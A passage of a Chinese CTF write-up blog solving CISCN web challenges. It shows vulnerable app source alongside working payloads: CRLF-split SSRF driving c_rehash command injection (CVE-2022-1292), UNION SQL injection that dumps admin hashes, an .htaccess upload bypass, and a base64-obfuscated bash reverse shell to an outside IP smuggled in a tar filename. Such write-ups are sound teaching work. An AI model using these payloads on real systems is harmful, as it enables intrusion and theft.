class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>这里有三条路由:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/getcrt : 创建一个crt证书, 并回显文件名</span><br><span class="line">/createlink : 使用c_rehash命令为创建的证书建立符号链接,  这里也就上面提到的cve命令关联了</span><br><span class="line">/proxy : 向服务器本地的8887端口发送get请求, 这里很容易看出来是有CRLF响应拆分漏洞</span><br></pre></td></tr></table></figure><p>关于响应拆分</p><p><a href="https://xz.aliyun.com/t/9707">https://xz.aliyun.com/t/9707</a></p><p>再看服务器本地运行的go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>) </span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易发现&#x2F;admin&#x2F;rename这条路由是更改我们创建的证书文件的文件名</p><p>与上面python的&#x2F;createlink路由的功能相结合就造成了CVE-2022-1292的利用点</p><p>首先创建一个证书并拿来文件名</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312155735785.png" alt="image-20240312155735785"></p><p>之后ssrf加响应拆分改文件名, 这里会踩坑,admin后的<code>/</code>必须url编码, 必须用form-data发包, 不然没有<code>\r\n</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180041150.png" alt="image-20240312180041150"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=7463b49b-69c6-49f5-8f3d-0d0f97161381.crt&amp;newname=`echo$&#123;IFS&#125;1$&#123;IFS&#125;&gt;a`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180125110.png" alt="image-20240312180125110"></p><p>可以发现成功写入</p><p>但是这里文件名不能包含<code>/</code>, 稍微绕过一下</p><p>这里试了很多次base64来绕过但是没有成功</p><p>之后是尝试${PATH:0:1}来绕过, 也没成功,</p><p>有说用${OLDPWD}的, 这个变量是表示当前目录,这里也不是<code>/</code></p><p>最后还是base64绕过, base64的内容是cat &#x2F;*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=07fc2723-258b-4873-9011-e2df6a4041e6.crt&amp;newname=`echo$&#123;IFS&#125;Y2F0IC8qIA==|base64$&#123;IFS&#125;--decode|bash&gt;flag.txt`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312223845842.png" alt="image-20240312223845842"></p><h2 id="CISCN-2019华东南-Double-Secret"><a href="#CISCN-2019华东南-Double-Secret" class="headerlink" title="[CISCN 2019华东南]Double Secret"></a>[CISCN 2019华东南]Double Secret</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">secret=request.args.get(<span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret. I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"></span><br><span class="line">rc = rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)  <span class="comment"># 解密</span></span><br><span class="line">deS = rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">a = render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rc4_Modified.RC4.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r = (self.Box[self.index_i] + self.Box[self.index_j]) % <span class="number">256</span></span><br><span class="line">R = self.Box[r]  <span class="comment"># 生成伪随机数</span></span><br><span class="line">tmp = <span class="built_in">ord</span>(s) ^ R</span><br><span class="line">test.append(tmp)</span><br><span class="line">out.append(<span class="built_in">chr</span>(tmp))</span><br><span class="line"><span class="comment"># print(test)</span></span><br><span class="line"><span class="comment"># print(len(test))</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br></pre></td></tr></table></figure><h2 id="CISCN-2023-西南-do-you-like-read"><a href="#CISCN-2023-西南-do-you-like-read" class="headerlink" title="[CISCN 2023 西南]do_you_like_read"></a>[CISCN 2023 西南]do_you_like_read</h2><p>进去就能找到一个注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php?bookisbn=-1%27union%20select%20database(),2,3,4,5,6,7,8--+</span><br></pre></td></tr></table></figure><p>obs_db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(table_name),2,3,4,5,6,7,8 from information_schema.tables where table_schema=&#x27;obs_db&#x27;--+</span><br></pre></td></tr></table></figure><p>admin,books,customers,order_items,orders,publisher</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(column_name),2,3,4,5,6,7,8 from information_schema.columns where table_name=&#x27;admin&#x27;--+</span><br></pre></td></tr></table></figure><p>name,pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(name,pass),2,3,4,5,6,7,8 from obs_db.admin--+</span><br></pre></td></tr></table></figure><p>adminf865b53623b121fd34ee5426c792e5c33af8c227</p><p>这里拿到了admin密码的哈希值</p><p>扔到解密网站跑一下, 直接出密码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102458081.png" alt="image-20240313102458081"></p><p>登录上去可以看见是有上传点</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102719572.png" alt="image-20240313102719572"></p><p>尝试传一个php, 发现自动被改成了.jpg</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313103055789.png" alt="image-20240313103055789"></p><p>尝试传.htaccess</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104133868.png" alt="image-20240313104133868"></p><p>访问之前被改了后缀的🐎</p><p>成功解析</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104212524.png" alt="image-20240313104212524"></p><p>看了下题解, 这好像是非预期</p><h2 id="CISCN-2019华北Day1-Web2"><a href="#CISCN-2019华北Day1-Web2" class="headerlink" title="[CISCN 2019华北Day1]Web2"></a>[CISCN 2019华北Day1]Web2</h2><h2 id="CISCN-2023-华北-pysym"><a href="#CISCN-2023-华北-pysym" class="headerlink" title="[CISCN 2023 华北]pysym"></a>[CISCN 2023 华北]pysym</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>这里有一个很明显的命令注入, 用sleep测一下发现的确可以注入,</p><p>直接弹个shell回来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;a.tar;echo$&#123;IFS&#125;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=|base64$&#123;IFS&#125;--decode|bash;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313114927363.png" alt="image-20240313114927363"></p><h2 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h2><p>注册登录后有上传文件</p><p>在文件下载的地方存在任意文件读取</p><p>关键文件 class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) 